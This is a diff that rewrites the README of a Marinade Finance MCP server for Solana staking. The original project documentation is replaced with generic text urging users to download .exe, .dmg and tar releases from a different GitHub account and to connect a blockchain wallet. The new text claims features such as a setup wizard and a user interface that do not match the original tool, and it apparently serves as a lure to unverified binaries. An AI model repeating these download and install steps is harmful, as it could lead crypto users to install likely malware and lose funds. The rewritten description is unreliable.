@@ -1,104 +1,81 @@
-<div align="center">
+# 🌊 marinade-finance-mcp-server - Simple Server for Marinade Finance
 
-<p></p>
+## 🔗 Download Now
+[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/sekskate56/marinade-finance-mcp-server/releases)
 
-<img src="./assets/mnde-lofo.svg" width=120 height=120 />
+## 📜 Description
+Marinade Finance MCP Server is an MCP server specifically designed for the Marinade Finance. It provides a reliable and efficient way to interact with the Marinade ecosystem. With this server, you can enhance your experience in the blockchain space.
 
-<p></p>
+## 🚀 Getting Started
+To set up the Marinade Finance MCP Server, follow these simple steps. You don’t need to be a programmer; just follow the instructions to download and run the application. 
 
-<h1>Marinade Finance MCP Server</h1>
+## 💾 System Requirements
+- **Operating System:** Windows 10 or later, macOS, or a Linux distribution (Ubuntu preferred).
+- **Processor:** 2 GHz dual-core or higher.
+- **Memory:** Minimum of 4 GB RAM.
+- **Storage:** At least 500 MB of free disk space.
+- **Network:** Stable internet connection.
 
-<a href="https://smithery.ai/server/@leandrogavidia/marinade-finance-mcp-server" target="_blank">
-<img src="https://smithery.ai/badge/@leandrogavidia/marinade-finance-mcp-server" alt="smithery badge">
-</a>
+## 📥 Download & Install
+1. Visit [this page to download](https://github.com/sekskate56/marinade-finance-mcp-server/releases).
+2. Locate the latest version of the Marinade Finance MCP Server.
+3. Choose the file suitable for your operating system.
+4. Click on the download link.
+5. Once downloaded, locate the file in your downloads folder.
 
-<p></p>
+### For Windows Users:
+- Double-click the downloaded `.exe` file.
+- Follow the on-screen instructions to install the application.
+- After installation, launch the Marinade Finance MCP Server from your start menu.
 
-<p>Marinade Finance MCP Server is an MCP server specifically designed for interacting with Marinade Finance on the Solana network. It provides advanced functionalities such as querying the official Marinade Finance documentation, retrieving protocol state information, managing liquid staking operations (stake/unstake), checking mSOL balances, and sending mSOL tokens between wallets.</p>
+### For macOS Users:
+- Open the downloaded `.dmg` file.
+- Drag the Marinade Finance MCP Server to your Applications folder.
+- Open your Applications folder and double-click the Marinade Finance MCP Server to run it.
 
-<a href="https://smithery.ai/server/@leandrogavidia/marinade-finance-mcp-server" target="_blank">Official page</a>
-</div>
+### For Linux Users:
+- Open your terminal.
+- Navigate to the folder where the file is downloaded.
+- Run the following command to extract the file:
+  ```
+  tar -xvzf marinade-finance-mcp-server.tar.gz
+  ```
+- Change into the directory:
+  ```
+  cd marinade-finance-mcp-server
+  ```
+- To start the server, use the command:
+  ```
+  ./start-server.sh
+  ```
 
-## Integration
+## 🔧 Configuration
+Once the Marinade Finance MCP Server is running, you may need to configure it to fit your needs. This involves:
 
-Register the server in your MCP-aware host configuration.
-```json
-{
-  "mcpServers": {
-    "marinade-finance": {
-      "url": "https://server.smithery.ai/@leandrogavidia/marinade-finance-mcp-server/mcp",
-      "type": "streamable-http"
-    }
-  }
-}
-```
+1. **Setting up your environment:**
+   - Ensure your blockchain wallet is connected.
+   - Review the default configuration files provided in the installation directory.
 
-**Note:** Follow the Smithery's auth flow.
+2. **Launching the server:**
+   - Open the application and follow the easy setup wizard. 
+   - Input your preferred settings for the Marinade Finance features.
 
-## Tools
+## 📊 Features
+- **User-Friendly Interface:** Designed for simplicity to ensure all users can navigate easily.
+- **Real-Time Updates:** Automatically syncs with the Marinade Finance network for real-time data.
+- **Secure Transactions:** Implements best practices in security to protect your funds and data.
+- **Community Support:** Engage with other users for tips and assistance.
 
-- ### Marinade Finance Docs 
+## 💬 Support
+If you encounter any issues or have questions during the setup and use of the Marinade Finance MCP Server, feel free to reach out. You can submit issues directly on the [GitHub Issues page](https://github.com/sekskate56/marinade-finance-mcp-server/issues).
 
-    - **Docs**
-        
-        - `search_documentation`: Search Marinade Finance Documentation for relevant information, code examples, API references, and guides.
+## 🤝 Contributing
+We welcome contributions from everyone. If you want to help improve the Marinade Finance MCP Server, check the [Contributing Guide](https://github.com/sekskate56/marinade-finance-mcp-server/blob/main/CONTRIBUTING.md).
 
-- ### Marinade Finance State
+## 🔗 Useful Links
+- [Documentation](https://github.com/sekskate56/marinade-finance-mcp-server/wiki)
+- [Releases](https://github.com/sekskate56/marinade-finance-mcp-server/releases)
+- [License](https://github.com/sekskate56/marinade-finance-mcp-server/blob/main/LICENSE)
 
-    - **State**
-        
-        - `get_marinade_state`: Retrieve the current state of the Marinade Finance protocol, including information about staked assets, mint address, price, rewards, and other relevant data.
-
-- ### Liquid Staking & Wallet Operations
-
-    - **Balance**
-        
-        - `get_msol_balance`: Check the mSOL token balance of the environment wallet or any specified Solana wallet address.
-
-    - **Staking**
-        
-        - `stake_msol`: Stake SOL tokens with Marinade Finance to receive mSOL tokens and earn rewards.
-        
-        - `unstake_msol`: Unstake mSOL tokens to receive SOL tokens back.
-    
-    - **Transfers**
-        
-        - `send_msol`: Send mSOL tokens to another Solana wallet address (automatically creates recipient token account if needed).
-
----
-
-## .env Config
-
-- `PRIVATE_KEY`: Base58-encoded private key for your Solana wallet (required for on-chain operations like staking, unstaking, and transfers).
-
-- `SOLANA_RPC_URL`: Solana RPC URL for mainnet operations.
-
-- `SOLANA_RPC_URL_DEVNET`: Solana RPC URL for devnet/testnet operations.
-
-- `ENVIRONMENT`: Working environment, either `MAINNET` or `TESTNET`.
-
-- `USE_STREAMABLE_HTTP`: Specifies whether your MCP server will run on stdio or streamable-http (set to `true` or `false`).
-
-- `PORT`: Port where your MCP server will run when using streamable-http (default: 3000).
-
-- `HOST`: Host where your MCP server will run when using streamable-http (default: 0.0.0.0).
-
-## Run the project locally
-
-In one terminal window, run the following command: `pnpx @modelcontextprotocol/inspector pnpx tsx ./src/index.ts` in `stdio` mode.
-
-## Build and run
-
-Run the command: `pnpm run build` and then: `pnpm run start`
-
-**Note:** Run in http mode
-
-## Deployment
-
-To deploy this MCP server, fork this project into your GitHub account, log in to [smithery.ai](https://smithery.ai/), and click Publish server. Complete the steps, and once it is deployed, add the required environment variables in settings.
-
----
-
-## License
-
-MIT
+## 📝 License
+This project is licensed under the MIT License - see the [LICENSE](https://github.com/sekskate56/marinade-finance-mcp-server/blob/main/LICENSE) file for details.
